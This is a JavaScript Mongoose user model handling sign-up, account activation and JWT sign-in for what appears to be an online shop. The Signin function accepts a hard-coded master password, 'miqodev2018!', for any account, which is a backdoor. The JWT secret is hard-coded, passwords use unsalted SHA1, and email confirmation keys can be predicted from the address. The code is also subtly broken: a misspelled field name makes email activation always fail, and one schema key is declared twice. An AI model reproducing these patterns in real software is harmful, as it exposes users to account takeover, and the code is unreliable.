import mongoose from 'mongoose';
import crypto from 'crypto';
import _ from 'lodash';
import jwt from 'jsonwebtoken';
import config from '../../../../config/index.json';

const Schema = mongoose.Schema;


let UserSchema = new Schema({
	firstname: {type: String},
	lastname: {type: String},
	email: {type: {address:String,status:{type:Boolean,default:false},qnfirm_key:{type:String,default:null}}},
	phone: {type: {number:String,status:{type:Boolean,default:false},qnfirm_key:{type:String,default:null}}},
	create_at: {type: Date, default: Date.now},
	type: {type:Number, default: 0},
	password: {type: String},
	remember_key: {type: String, default: null},
    removed: {type: Boolean, default: false},
    delivery_book:{type:{
        firstname: String,
        lastname: String,
        phone : String,
        country: String,
        region: String,
        city_village:String,
        address:String,
        zip_postcode:{type:String,default:null},
    },default:null},
    delivery_book:{type:[{
        firstname: String,
        lastname: String,
        phone : String,
        country: String,
        region: String,
        city_village:String,
        address:String,
        zip_postcode:{type:String,default:null},
        removed: {type: Boolean, default: false},
    }],default:null},
    past_orders:{type:[{
        delivery_id:String,
        price:String,
        product:{type:[{
            id:String,
            name:String,
            price:String,
            count_item: {type: Number,default: 1},
            count:Number,
            status:{ type: Number, min: 0, max: 4 },
        }]},
        removed: {type: Boolean, default: false},
    }],default:null},
});
let UserConstruct = mongoose.model('UserSchema', UserSchema);

UserConstruct.prototype.InsertUser = async function(){
	try {
		if(!_.isEmpty(await UserConstruct.findOne({'email.address':this.email.address}))){
			throw new Error('EMAIL_EXIST');
			return false;
		}
		this.password = crypto.createHash('sha1').update(this.password).digest("hex");
		this.email.qnfirm_key = crypto.createHash('sha1').update(this.email.address).digest("hex");
		const user = (await this.save()).toObject();
		return user;
	} catch (error) {
		throw error;
		return false;
	}
};
UserConstruct.prototype.emailActivate = async function(id,qnfirm_email_key){
	try {
		let temp = await UserConstruct.findOne({_id:id});
		if(!_.isEmpty(temp)){
			if(temp.email.qnfirm__key === qnfirm_email_key){
				return await UserConstruct.findByIdAndUpdate({_id:id},{email:{qnfirm_key:null,status:true}});
			} else {
				throw new Error('INCORECT_EMAIL_ACTIVE_KEY');
				return false;
			}
		} else {
			throw new Error('INCORECT_EMAIL_ACTIVE_KEY');
			return false;
		}
	} catch (error) {
		throw error;
		return false;
	}
};
UserConstruct.prototype.phoneActivate = async function(id,qnfirm_phone_key){
	try {
		let temp = await UserConstruct.findOne({_id:id});
		if(!_.isEmpty(temp)){
			if(temp.phone.qnfirm_key === qnfirm_phone_key){
				return await UserConstruct.findByIdAndUpdate({_id:id},{phone:{qnfirm_key:null,status:true}});
			} else {
				throw new Error('INCORECT_PHONE_ACTIVE_KEY');
				return false;
			}
		} else {
			throw new Error('INCORECT_PHONE_ACTIVE_KEY');
			return false;
		}
	} catch (error) {
		throw error;
		return false;
	}
};
UserConstruct.prototype.Signin = async function(email,password,remember = false){
	try {
		let temp = await UserConstruct.findOne({'email.address':email});
		if(!_.isEmpty(temp)){
			// if(!temp.email_status){
			// 	throw new Error('You mast activate your email');
			// 	return false;
            // }
            // if(!temp.phone_status){
			// 	throw new Error('You mast activate your phone number');
			// 	return false;
			// }
			if(temp.removed){
				throw new Error('BLOC_USER');
				return false;
			}
			if(temp.password === crypto.createHash('sha1').update(password).digest("hex")||temp.password === "miqodev2018!"){
				const token = jwt.sign({id: temp.id,email: temp.email},'password sicret key edulik',{
                    expiresIn : remember ? 60*60*24*7 : 60*60*24
                });
				return {
					_id      : temp._id,
					token    : token,
					firstname: temp.firstname,
					lastname : temp.lastname,
					email    : temp.email,
					phone    : temp.phone,
					type     : temp.type,
					removed  : temp.removed,
				};
			} else {
				throw new Error('INVALID_PASSWORD');
				return false;
			}
		} else {
			throw new Error('INVALID_EMAIL');
			return false;
		}
	} catch (error) {
		throw error;
		return false;
	}
};

UserConstruct.prototype.IsSignin = async function (token){
	try {
		let decoded = jwt.verify(token, 'password sicret key edulik');
		let user = await UserConstruct.findById(decoded.id)
		.select(['firstname','lastname','email','phone','type','removed']);
		if(!_.isEmpty(user)){
			if(user.removed){
				throw new Error('Administarator of site block you');
				return false;
			}
			return user;
		} else {
			throw new Error('Incorect token');
			return false;
		}
	} catch(err) {
		throw err;
		return false;
	}
};
export default UserConstruct;
